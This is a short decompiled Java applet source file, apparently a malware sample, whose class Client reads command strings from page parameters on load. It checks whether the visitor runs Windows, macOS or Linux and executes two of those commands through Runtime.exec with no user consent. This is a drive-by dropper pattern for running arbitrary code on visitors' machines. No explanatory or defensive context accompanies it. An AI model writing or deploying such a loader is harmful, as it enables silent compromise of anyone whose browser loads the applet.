import java.io.IOException;
import java.applet.Applet;

// 
// Decompiled by Procyon v0.5.30
// 

public class Client extends Applet
{
    public void init() {
        final String window1 = this.getParameter("windows1");
        final String windows2 = this.getParameter("windows2");
        final String linux1 = this.getParameter("linux1");
        final String linux2 = this.getParameter("linux2");
        final String unix1 = this.getParameter("unix1");
        final String unix2 = this.getParameter("unix2");
        final String os = System.getProperty("os.name").toLowerCase();
        if (os.indexOf("win") >= 0) {
            try {
                final Process w1 = Runtime.getRuntime().exec(window1);
                final Process w2 = Runtime.getRuntime().exec(windows2);
            }
            catch (IOException e) {
                e.printStackTrace();
            }
        }
        if (os.indexOf("mac") >= 0) {
            try {
                final Process u1 = Runtime.getRuntime().exec(unix1);
                final Process u2 = Runtime.getRuntime().exec(unix2);
            }
            catch (IOException e) {
                e.printStackTrace();
            }
        }
        if (os.indexOf("lin") < 0) {
            return;
        }
        try {
            final Process l1 = Runtime.getRuntime().exec(linux1);
            final Process l2 = Runtime.getRuntime().exec(linux2);
        }
        catch (IOException e) {
            e.printStackTrace();
        }
    }
}
